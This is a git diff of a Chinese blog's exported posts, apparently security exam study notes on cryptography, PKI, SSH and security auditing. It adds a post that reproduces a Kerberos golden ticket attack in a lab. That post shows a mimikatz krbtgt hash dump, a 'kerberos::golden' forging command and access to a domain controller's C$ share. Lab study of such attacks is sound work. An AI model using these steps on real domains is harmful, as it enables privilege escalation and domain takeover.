+<li>给定h和M，计算h(M)是容易的</li>
+<li>给定h的描述，找两个不同的消息M1和M2，使h(M1)=h(M2)是计算上不可行的。</li>
+</ul>
+<h2 id="Hash算法"><a href="#Hash算法" class="headerlink" title="Hash算法"></a>Hash算法</h2><p>将任意长的比特串映射到一个固定长的比特串。</p>
+<p>算法：MD5算法、SHA算法、SM3国产算法</p>
+<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>确认数据的完整性、真实性和抗抵赖性。</p>
+<p>满足三个条件：1. 非否认。2. 真实性。3. 可鉴别性。</p>
+<ul>
+<li>数字签名流程：<ol>
+<li>A用Hash函数加密文件形成摘要</li>
+<li>A用自己私钥将消息摘要加密，形成数字签名。</li>
+<li>A将加密摘要和原文一并发给B</li>
+</ol>
+</li>
+<li>验证签名流程：<ol>
+<li>B使用A相同Hash算法计算文件摘要</li>
+<li>B使用A公钥解密数字签名，恢复A的消息摘要</li>
+<li>比较两个消息摘要，一致则未被篡改</li>
+</ol>
+</li>
+</ul>
+<h1 id="密码管理与数字签名"><a href="#密码管理与数字签名" class="headerlink" title="密码管理与数字签名"></a>密码管理与数字签名</h1><h2 id="密码管理"><a href="#密码管理" class="headerlink" title="密码管理"></a>密码管理</h2><ol>
+<li>密钥管理</li>
+</ol>
+<p>生命周期：密钥生成、密钥存储、密钥分发、密钥使用、密钥更新、密钥撤销、密钥备份、密钥恢复、密钥销毁、密钥审计。</p>
+<ol>
+<li><p>密码管理政策</p>
+<p>《商用密码管理条例》：商用密码的科研生产管理、销售管理、使用管理、安全保密管理。</p>
+<p>《中华人民共和国密码法》：密码分为核心密码、普通密码、商用密码。</p>
+</li>
+<li><p>密码测评</p>
+<p>对相关密码产品即系统安全行、合规性评估。</p>
+<p>机构：商用密码检测中心</p>
+</li>
+</ol>
+<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>公钥证书，由认证机构（CA）签名包含公开密钥拥有者信息、公开密钥、签发者信息、有效期以及扩展信息的一种数据结构。</p>
+<p>类别：个人证书、机构证书和设备证书</p>
+<p>用途：签名证书和加密证书</p>
+<p>CA：提供证书的申请、审核、签发、查询、发布以及证书吊销等全生命周期的管理服务。</p>
+<p>认证系统主要有目录服务器、OCSP服务器、注册服务器、签发服务器等。</p>
+<p>典型的PKI系统由5个基本部分组成：<strong>证书申请者、RA注册中心、CA认证中心、证书库和证书信任方</strong>。</p>
+<h1 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h1><h2 id="Diffie-Hellman密钥交换协议"><a href="#Diffie-Hellman密钥交换协议" class="headerlink" title="Diffie-Hellman密钥交换协议"></a>Diffie-Hellman密钥交换协议</h2><script type="math/tex; mode=display">
+C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M求d需指数级次计算。</p>
+<p>操作步骤：</p>
+<ol>
+<li>A与B确定一个素数p和整数a，并使a是p的原根，a，p可公开</li>
+<li>A秘密选取整数$a_A$，计算$y_A=a^{a_A}mod(p)$,并把$y_A$发送给B</li>
+<li>B密码选取整数$a_B$，计算$y_B=a^{a_B}mod(p)$,并把$y_B$发送给A，$y_A$和$y_B$即公开值</li>
+<li>A和B双方分别计算出共享密钥K</li>
+</ol>
+<p>A：$K=(y_B)^{a_A}mod(p)$</p>
+<p>B：<script type="math/tex">K=(y_A)^{a_B}mod(p)</script></p>
+<p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/Diffie-Hellman.jpg" alt></p>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>组成：SSH传输层协议、SSH用户认证协议和SSH连接协议三个子协议。</p>
+<p>SSH工作机制7个步骤：</p>
+<p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/SSH工作流程.jpg" alt></p>
+<p>认证服务器的公钥真实性：</p>
+<ol>
+<li>随身携带含有服务器公钥的拷贝，进行密钥交换前，读入客户端</li>
+<li>从公开信道下载公钥和指纹，通过电话验证公钥指纹的真实性，用HASH软件生成公钥指纹，进行比较</li>
+<li>通过PKI技术来验证服务器</li>
 </ol>
 ]]></content>
       <categories>
@@ -2343,108 +2343,6 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </tags>
   </entry>
   <entry>
-    <title>第12章 网络安全技术原理与应用</title>
-    <url>/2020/09/23/%E7%AC%AC12%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="网络安全审计概述"><a href="#网络安全审计概述" class="headerlink" title="网络安全审计概述"></a>网络安全审计概述</h1><p>常见的功能：安全事件采集、存储和查询</p>
-<h2 id="网络安全审计相关标准"><a href="#网络安全审计相关标准" class="headerlink" title="网络安全审计相关标准"></a>网络安全审计相关标准</h2><p><img src="/2020/09/23/%E7%AC%AC12%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/审计要求.jpg" style="zoom:50%;"></p>
-<a id="more"></a>
-<h2 id="网络安全升级相关法规政策"><a href="#网络安全升级相关法规政策" class="headerlink" title="网络安全升级相关法规政策"></a>网络安全升级相关法规政策</h2><p>《中华人民共和国网络安全法》：采取监测、记录网络运行状态、网络安全事件技术措施，并按照规定留存相关的网络<strong>日志不少于六个月</strong></p>
-<h1 id="网络安全审计系统组成与类型"><a href="#网络安全审计系统组成与类型" class="headerlink" title="网络安全审计系统组成与类型"></a>网络安全审计系统组成与类型</h1><h2 id="网络安全升级系统组成"><a href="#网络安全升级系统组成" class="headerlink" title="网络安全升级系统组成"></a>网络安全升级系统组成</h2><p><img src="/2020/09/23/%E7%AC%AC12%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/审计系统组成.jpg" style="zoom:50%;"></p>
-<h2 id="网络安全审计系统类型"><a href="#网络安全审计系统类型" class="headerlink" title="网络安全审计系统类型"></a>网络安全审计系统类型</h2><p>按审计对象类型分：</p>
-<ul>
-<li>操作系统安全审计（对用户和服务进行记录，包括用户登录和注销、服务启动和关闭、安全事件等）</li>
-<li>数据库安全审计（监控并记录用户对数据库服务器的读、写、查询、添加、修改以及删除等操作，并可以对数据库操作命令进行回放）</li>
-<li>网络通信安全审计（对网络流量进行存储和分析）</li>
-<li>应用系统安全审计</li>
-<li>工控安全审计</li>
-<li>移动安全审计</li>
-<li>互联网安全审计</li>
-<li>代码安全审计</li>
-</ul>
-<p>按审计范围分：</p>
-<ul>
-<li>综合审计系统</li>
-<li>单个审计系统（常见：系统或产品自带的审计功能）</li>
-</ul>
-<h1 id="网络安全审计机制与实现技术"><a href="#网络安全审计机制与实现技术" class="headerlink" title="网络安全审计机制与实现技术"></a>网络安全审计机制与实现技术</h1><p>审计机制：基于主机、基于网络通信、基于应用的审计机制等</p>
-<h2 id="系统日志数据采集技术"><a href="#系统日志数据采集技术" class="headerlink" title="系统日志数据采集技术"></a>系统日志数据采集技术</h2><p>信息汇聚到统一的日志存储服务器，常见：SysLog、SNMPTrap等</p>
-<h2 id="网络流量数据获取技术"><a href="#网络流量数据获取技术" class="headerlink" title="网络流量数据获取技术"></a>网络流量数据获取技术</h2><p>技术方法：</p>
-<ul>
-<li><p>共享网络监听</p>
-<p>Hub集线器构建</p>
-</li>
-<li><p>交换机端口镜像</p>
-</li>
-<li><p>网络分流器等</p>
-</li>
-</ul>
-<p>常见软件是Libpcap（开源）、Winpcap、Wireshark</p>
-<p>Libpcap工作流程：</p>
-<ol>
-<li>设置嗅探网络接口</li>
-<li>初始化Libpcap，设定过滤规则</li>
-<li>运行Libpcap循环主体，接收符合规则的数据包</li>
-</ol>
-<h2 id="网络审计数据安全分析技术"><a href="#网络审计数据安全分析技术" class="headerlink" title="网络审计数据安全分析技术"></a>网络审计数据安全分析技术</h2><ol>
-<li>字符串匹配</li>
-<li>全文搜索</li>
-<li>数据关联</li>
-<li>统计报表</li>
-<li>可视化分析</li>
-</ol>
-<h2 id="网络审计数据存储技术"><a href="#网络审计数据存储技术" class="headerlink" title="网络审计数据存储技术"></a>网络审计数据存储技术</h2><ul>
-<li>由审计数据产生的系统自己分散存储，审计数据保存在不同的系统中</li>
-<li>集中采集各种系统的审计数据，建立审计数据存储服务器。</li>
-</ul>
-<h2 id="网络审计数据保护技术"><a href="#网络审计数据保护技术" class="headerlink" title="网络审计数据保护技术"></a>网络审计数据保护技术</h2><ol>
-<li>系统用户分权管理（操作员、安全员和审计员）</li>
-<li>审计数据强制访问（采取强制访问控制措施）</li>
-<li>审计数据加密</li>
-<li>审计数据隐私保护</li>
-<li>升级数据完整性保护（使用Hash算法和数字签名）</li>
-</ol>
-<h1 id="网络安全审计主要产品与技术指标"><a href="#网络安全审计主要产品与技术指标" class="headerlink" title="网络安全审计主要产品与技术指标"></a>网络安全审计主要产品与技术指标</h1><h2 id="日志安全审计产品"><a href="#日志安全审计产品" class="headerlink" title="日志安全审计产品"></a>日志安全审计产品</h2><p>主要功能：日志采集、存储、分析、查询，事件告警，统计报表，系统管理等</p>
-<h2 id="主机监控与审计产品"><a href="#主机监控与审计产品" class="headerlink" title="主机监控与审计产品"></a>主机监控与审计产品</h2><p>通过代理程序</p>
-<p>主要功能：系统用户监控、系统配置管理、补丁管理、准人控制、存储介质（U盘）管理、非法外联管理等</p>
-<h2 id="数据库审计产品"><a href="#数据库审计产品" class="headerlink" title="数据库审计产品"></a>数据库审计产品</h2><p>三种方式：</p>
-<ol>
-<li>网络监听审计（优点：不影响数据库服务器；不足：加密数据库网络流量和本地操作难以审计）</li>
-<li>自带审计（优点：实现数据库网络操作和本地操作审计；缺点：对性能有影响，审计策略配置、记录粒度、日志统一分析不够完善，日志本地存储容易被删除）</li>
-<li>数据库Agent（优点：实现数据库网络操作和本地操作审计；缺点，需要安装Agent，影响性能、稳定性、可靠性）</li>
-</ol>
-<h2 id="网络安全审计产品"><a href="#网络安全审计产品" class="headerlink" title="网络安全审计产品"></a>网络安全审计产品</h2><p>常见功能：</p>
-<ol>
-<li>网络流量采集</li>
-<li>网络流量数据挖掘分析</li>
-</ol>
-<p>性能指标主要有：支持网络带宽大小、协议识别种类、原始数据包查询响应时间等</p>
-<h2 id="工业控制系统网络审计产品"><a href="#工业控制系统网络审计产品" class="headerlink" title="工业控制系统网络审计产品"></a>工业控制系统网络审计产品</h2><p>原理：利用网络流量采集和协议识别技术，对工控协议还原，形成操作信息记录，进行保存分析</p>
-<p>两种实现方式：</p>
-<ul>
-<li>一体化集中产品</li>
-<li>有采集端和分析端两部分组成</li>
-</ul>
-<h2 id="运维安全审计产品"><a href="#运维安全审计产品" class="headerlink" title="运维安全审计产品"></a>运维安全审计产品</h2><p>主要功能：</p>
-<ol>
-<li>字符会话审计（审计SSH、Telnet协议的操作行为）</li>
-<li>图形操作审计（RDP、VNC以及HTTP/HTTPS协议的图形操作行为）</li>
-<li>数据库运维审计（Oracle、MS SQL Server、IBM DB2、PostgreSQL）</li>
-<li>文件传输审计（FTP、SFTP等协议）</li>
-<li>合规审计</li>
-</ol>
-<h1 id="网络安全审计应用"><a href="#网络安全审计应用" class="headerlink" title="网络安全审计应用"></a>网络安全审计应用</h1><h2 id="安全运维保障"><a href="#安全运维保障" class="headerlink" title="安全运维保障"></a>安全运维保障</h2><p>有效防范和追溯安全威胁操作。例如：通过关联分析还原堡垒机绕行运维操作。</p>
-<h2 id="数据访问监测"><a href="#数据访问监测" class="headerlink" title="数据访问监测"></a>数据访问监测</h2><p>分析数据库访问日志，可以自动发现违规访问的问题。</p>
-<h2 id="网络入侵检测"><a href="#网络入侵检测" class="headerlink" title="网络入侵检测"></a>网络入侵检测</h2><p>对网络设备、安全设备、应用系统的日志信息进行实时收集和分析，可检测发现攻击行为</p>
-<h2 id="网络电子取证"><a href="#网络电子取证" class="headerlink" title="网络电子取证"></a>网络电子取证</h2><p>日志分析技术</p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第13章 网络安全漏洞防护技术原理与应用</title>
     <url>/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
     <content><![CDATA[<h1 id="网络安全漏洞概述"><a href="#网络安全漏洞概述" class="headerlink" title="网络安全漏洞概述"></a>网络安全漏洞概述</h1><p>影响：机密性受损、完整性破坏、可用性降低、抗抵赖性缺失、可控性下降、真实性不保等</p>
@@ -2840,6 +2738,108 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
 </ol>
 <h1 id="恶意代码防护技术应用"><a href="#恶意代码防护技术应用" class="headerlink" title="恶意代码防护技术应用"></a>恶意代码防护技术应用</h1><p>终端防护</p>
 <p>APT防护</p>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第12章 网络安全技术原理与应用</title>
+    <url>/2020/09/23/%E7%AC%AC12%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="网络安全审计概述"><a href="#网络安全审计概述" class="headerlink" title="网络安全审计概述"></a>网络安全审计概述</h1><p>常见的功能：安全事件采集、存储和查询</p>
+<h2 id="网络安全审计相关标准"><a href="#网络安全审计相关标准" class="headerlink" title="网络安全审计相关标准"></a>网络安全审计相关标准</h2><p><img src="/2020/09/23/%E7%AC%AC12%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/审计要求.jpg" style="zoom:50%;"></p>
+<a id="more"></a>
+<h2 id="网络安全升级相关法规政策"><a href="#网络安全升级相关法规政策" class="headerlink" title="网络安全升级相关法规政策"></a>网络安全升级相关法规政策</h2><p>《中华人民共和国网络安全法》：采取监测、记录网络运行状态、网络安全事件技术措施，并按照规定留存相关的网络<strong>日志不少于六个月</strong></p>
+<h1 id="网络安全审计系统组成与类型"><a href="#网络安全审计系统组成与类型" class="headerlink" title="网络安全审计系统组成与类型"></a>网络安全审计系统组成与类型</h1><h2 id="网络安全升级系统组成"><a href="#网络安全升级系统组成" class="headerlink" title="网络安全升级系统组成"></a>网络安全升级系统组成</h2><p><img src="/2020/09/23/%E7%AC%AC12%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/审计系统组成.jpg" style="zoom:50%;"></p>
+<h2 id="网络安全审计系统类型"><a href="#网络安全审计系统类型" class="headerlink" title="网络安全审计系统类型"></a>网络安全审计系统类型</h2><p>按审计对象类型分：</p>
+<ul>
+<li>操作系统安全审计（对用户和服务进行记录，包括用户登录和注销、服务启动和关闭、安全事件等）</li>
+<li>数据库安全审计（监控并记录用户对数据库服务器的读、写、查询、添加、修改以及删除等操作，并可以对数据库操作命令进行回放）</li>
+<li>网络通信安全审计（对网络流量进行存储和分析）</li>
+<li>应用系统安全审计</li>
+<li>工控安全审计</li>
+<li>移动安全审计</li>
+<li>互联网安全审计</li>
+<li>代码安全审计</li>
+</ul>
+<p>按审计范围分：</p>
+<ul>
+<li>综合审计系统</li>
+<li>单个审计系统（常见：系统或产品自带的审计功能）</li>
+</ul>
+<h1 id="网络安全审计机制与实现技术"><a href="#网络安全审计机制与实现技术" class="headerlink" title="网络安全审计机制与实现技术"></a>网络安全审计机制与实现技术</h1><p>审计机制：基于主机、基于网络通信、基于应用的审计机制等</p>
+<h2 id="系统日志数据采集技术"><a href="#系统日志数据采集技术" class="headerlink" title="系统日志数据采集技术"></a>系统日志数据采集技术</h2><p>信息汇聚到统一的日志存储服务器，常见：SysLog、SNMPTrap等</p>
+<h2 id="网络流量数据获取技术"><a href="#网络流量数据获取技术" class="headerlink" title="网络流量数据获取技术"></a>网络流量数据获取技术</h2><p>技术方法：</p>
+<ul>
+<li><p>共享网络监听</p>
+<p>Hub集线器构建</p>
+</li>
+<li><p>交换机端口镜像</p>
+</li>
+<li><p>网络分流器等</p>
+</li>
+</ul>
+<p>常见软件是Libpcap（开源）、Winpcap、Wireshark</p>
+<p>Libpcap工作流程：</p>
+<ol>
+<li>设置嗅探网络接口</li>
+<li>初始化Libpcap，设定过滤规则</li>
+<li>运行Libpcap循环主体，接收符合规则的数据包</li>
+</ol>
+<h2 id="网络审计数据安全分析技术"><a href="#网络审计数据安全分析技术" class="headerlink" title="网络审计数据安全分析技术"></a>网络审计数据安全分析技术</h2><ol>
+<li>字符串匹配</li>
+<li>全文搜索</li>
+<li>数据关联</li>
+<li>统计报表</li>
+<li>可视化分析</li>
+</ol>
+<h2 id="网络审计数据存储技术"><a href="#网络审计数据存储技术" class="headerlink" title="网络审计数据存储技术"></a>网络审计数据存储技术</h2><ul>
+<li>由审计数据产生的系统自己分散存储，审计数据保存在不同的系统中</li>
+<li>集中采集各种系统的审计数据，建立审计数据存储服务器。</li>
+</ul>
+<h2 id="网络审计数据保护技术"><a href="#网络审计数据保护技术" class="headerlink" title="网络审计数据保护技术"></a>网络审计数据保护技术</h2><ol>
+<li>系统用户分权管理（操作员、安全员和审计员）</li>
+<li>审计数据强制访问（采取强制访问控制措施）</li>
+<li>审计数据加密</li>
+<li>审计数据隐私保护</li>
+<li>升级数据完整性保护（使用Hash算法和数字签名）</li>
+</ol>
+<h1 id="网络安全审计主要产品与技术指标"><a href="#网络安全审计主要产品与技术指标" class="headerlink" title="网络安全审计主要产品与技术指标"></a>网络安全审计主要产品与技术指标</h1><h2 id="日志安全审计产品"><a href="#日志安全审计产品" class="headerlink" title="日志安全审计产品"></a>日志安全审计产品</h2><p>主要功能：日志采集、存储、分析、查询，事件告警，统计报表，系统管理等</p>
+<h2 id="主机监控与审计产品"><a href="#主机监控与审计产品" class="headerlink" title="主机监控与审计产品"></a>主机监控与审计产品</h2><p>通过代理程序</p>
+<p>主要功能：系统用户监控、系统配置管理、补丁管理、准人控制、存储介质（U盘）管理、非法外联管理等</p>
+<h2 id="数据库审计产品"><a href="#数据库审计产品" class="headerlink" title="数据库审计产品"></a>数据库审计产品</h2><p>三种方式：</p>
+<ol>
+<li>网络监听审计（优点：不影响数据库服务器；不足：加密数据库网络流量和本地操作难以审计）</li>
+<li>自带审计（优点：实现数据库网络操作和本地操作审计；缺点：对性能有影响，审计策略配置、记录粒度、日志统一分析不够完善，日志本地存储容易被删除）</li>
+<li>数据库Agent（优点：实现数据库网络操作和本地操作审计；缺点，需要安装Agent，影响性能、稳定性、可靠性）</li>
+</ol>
+<h2 id="网络安全审计产品"><a href="#网络安全审计产品" class="headerlink" title="网络安全审计产品"></a>网络安全审计产品</h2><p>常见功能：</p>
+<ol>
+<li>网络流量采集</li>
+<li>网络流量数据挖掘分析</li>
+</ol>
+<p>性能指标主要有：支持网络带宽大小、协议识别种类、原始数据包查询响应时间等</p>
+<h2 id="工业控制系统网络审计产品"><a href="#工业控制系统网络审计产品" class="headerlink" title="工业控制系统网络审计产品"></a>工业控制系统网络审计产品</h2><p>原理：利用网络流量采集和协议识别技术，对工控协议还原，形成操作信息记录，进行保存分析</p>
+<p>两种实现方式：</p>
+<ul>
+<li>一体化集中产品</li>
+<li>有采集端和分析端两部分组成</li>
+</ul>
+<h2 id="运维安全审计产品"><a href="#运维安全审计产品" class="headerlink" title="运维安全审计产品"></a>运维安全审计产品</h2><p>主要功能：</p>
+<ol>
+<li>字符会话审计（审计SSH、Telnet协议的操作行为）</li>
+<li>图形操作审计（RDP、VNC以及HTTP/HTTPS协议的图形操作行为）</li>
+<li>数据库运维审计（Oracle、MS SQL Server、IBM DB2、PostgreSQL）</li>
+<li>文件传输审计（FTP、SFTP等协议）</li>
+<li>合规审计</li>
+</ol>
+<h1 id="网络安全审计应用"><a href="#网络安全审计应用" class="headerlink" title="网络安全审计应用"></a>网络安全审计应用</h1><h2 id="安全运维保障"><a href="#安全运维保障" class="headerlink" title="安全运维保障"></a>安全运维保障</h2><p>有效防范和追溯安全威胁操作。例如：通过关联分析还原堡垒机绕行运维操作。</p>
+<h2 id="数据访问监测"><a href="#数据访问监测" class="headerlink" title="数据访问监测"></a>数据访问监测</h2><p>分析数据库访问日志，可以自动发现违规访问的问题。</p>
+<h2 id="网络入侵检测"><a href="#网络入侵检测" class="headerlink" title="网络入侵检测"></a>网络入侵检测</h2><p>对网络设备、安全设备、应用系统的日志信息进行实时收集和分析，可检测发现攻击行为</p>
+<h2 id="网络电子取证"><a href="#网络电子取证" class="headerlink" title="网络电子取证"></a>网络电子取证</h2><p>日志分析技术</p>
 ]]></content>
       <categories>
         <category>信息安全工程师软考</category>
@@ -4750,6 +4750,182 @@ Dec[En(a)⊙En(b)]=a⊕b</script><p>En加密运算，Dec解密运算，当$⊕$�
       </tags>
   </entry>
   <entry>
+    <title>域基础及黄金票据复现</title>
+    <url>/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>啥都不说，做合规工作，偶尔更新一下。新年第一个博客，就简单写一下这几天复现的经典域环境中的黄金票据问题吧。</p>
+<h1 id="0x01-域环境搭建"><a href="#0x01-域环境搭建" class="headerlink" title="0x01 域环境搭建"></a>0x01 域环境搭建</h1><p>虚拟机安装，网卡设置仅主机模式。</p>
+<p>域控机器：windows service2016</p>
+<p>客户端：Windows10</p>
+<p><em>其中域控机器的DNS与IP一致，客户端DNS设置为域控机器的IP。</em></p>
+<a id="more"></a>
+<p>系统安装过程省略。</p>
+<p>在使用win10客户端加入域控时，出现大致<strong>如下错误：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;DNS 服务器失败。&quot;</span><br><span class="line"> (错误代码 0x0000232A RCODE_SERVER_FAILURE)</span><br><span class="line"></span><br><span class="line">此查询用于查找 _ldap._tcp.dc._msdcs.throld.com 的 SRV 记录</span><br></pre></td></tr></table></figure>
+<p>此时在DNS管理器中缺少_ldap的记录。（以下为修复后出现_ldap记录）</p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/ldap记录.png" alt></p>
+<p><strong>解决方案：</strong></p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/加域解决.png" alt></p>
+<p>此外，本人还重启了DNS服务，域环境搭建完成。</p>
+<h1 id="0x02-Kerberos认证"><a href="#0x02-Kerberos认证" class="headerlink" title="0x02 Kerberos认证"></a>0x02 Kerberos认证</h1><p>域内认证即采用了Kerberos协议的认证机制，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。与本地认证和网络认证相比最大的区别是有个一个可信的第三方机构KDC的参与。</p>
+<p><strong>参与域认证的三个角色：</strong></p>
+<ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC(Key Distribution Center) = DC(Domain Controller)</li>
+</ul>
+<h2 id="Kerberos几个重要组件"><a href="#Kerberos几个重要组件" class="headerlink" title="Kerberos几个重要组件"></a>Kerberos几个重要组件</h2><p><strong>KDC：</strong></p>
+<p>KDC负责管理发放Ticket和记录授权的中心服务器，包含两部分：AS认证服务器（Authentication Server）,TGS服务授权服务器(Ticket Granting Server)</p>
+<ul>
+<li>Authentication Service：验证Client的身份，验证通过就会生成一个TGT (Ticket Granting Ticket) 给Client</li>
+<li>Ticket Granting Service： 为client用AS给予的TGT票据换取访问Server的ticket</li>
+</ul>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/KDC.png" alt></p>
+<p><strong>其他重要组件：</strong></p>
+<ul>
+<li>AD（account database）：存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT</li>
+<li>Client 客户端：需要使用kerberos服务的客户端</li>
+<li>Server 服务端：提供具体服务的服务端</li>
+</ul>
+<h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>kerberos认证交互过程可以简要概括为以下图片中的三次通信：</p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/Kerberos.png" alt></p>
+<p><strong>粗略流程：</strong></p>
+<ol>
+<li>client先向DC请求，要求获取访问server的权限，当DC接收到请求之后，先由AS向AD发起请求，查看此client是否在白名单中，成功后，则由AS将TGT返回给client。 </li>
+<li>然后client带着TGT继续向DC发起请求，要求获取访问server的权限，当DC接收到请求后，TGS会通过TGT判断此client是否有获取server服务的权限，成功后，则将Ticket返回给client。</li>
+<li>最后client凭借Ticket去访问所请求的server，这个Ticket只对该server有效，如果要访问其他server，需要重新申请。 </li>
+</ol>
+<p>详细过程见：<a href="https://1sparrow.com/2018/02/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/">Kerberos认证相关</a></p>
+<h1 id="0x03-黄金票据复现"><a href="#0x03-黄金票据复现" class="headerlink" title="0x03 黄金票据复现"></a>0x03 黄金票据复现</h1><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p>
+<p>由来：</p>
+<blockquote>
+<p>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。 因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过, 理论上讲网络上只有两方能够解密TGT:</p>
+<p>​    颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。 </p>
+<p>这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</p>
+</blockquote>
+<p><strong>复现流程：</strong>（以下操作均在win10客户端操作）</p>
+<ol>
+<li><p>提权到管理员用户，使用mimikatz导出krbtgt NTLM Hash</p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/hash.png" alt></p>
+</li>
+<li><p>生成黄金票据，在目录下生成了golden.ti票据文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:domain-name &#x2F;sid:user-sid &#x2F;krbtgt:ntlmhash-value &#x2F;ticket:golden.ti</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/生成票据.png" alt></p>
+<p>（<strong>注：</strong>SID复制时去掉最后的RID（502），不然生成的票据无法使用。）</p>
+</li>
+<li><p>此时使用普通用户打开mimikatz，导入golden.ti，低权限本地用户，就被提升到域管理权限。</p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/导入票据.png" alt></p>
+</li>
+<li><p>此时使用使用dir <a href="file:///ad.test.local/c$">\\ad.test.local\c$</a>查看文件夹可以访问，与之前对比：</p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/dir1.png" alt></p>
+<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/dir2.png" alt="dir2"></p>
+</li>
+</ol>
